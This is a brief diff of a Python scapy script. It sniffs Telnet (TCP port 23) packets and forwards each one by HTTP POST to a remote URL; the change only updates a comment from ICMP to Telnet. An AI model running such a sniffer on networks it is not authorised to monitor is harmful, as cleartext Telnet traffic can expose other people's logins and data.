@@ -26,6 +26,6 @@ def uploadPacket(a):
 	}
 	r = requests.post(url, data=json.dumps(payload), headers=headers)
 	
-##sniff ICMP packets	
+##sniff Telnet packets	
 count = 200
 sniff(prn=uploadPacket, filter="tcp port 23 and ip", count=10)
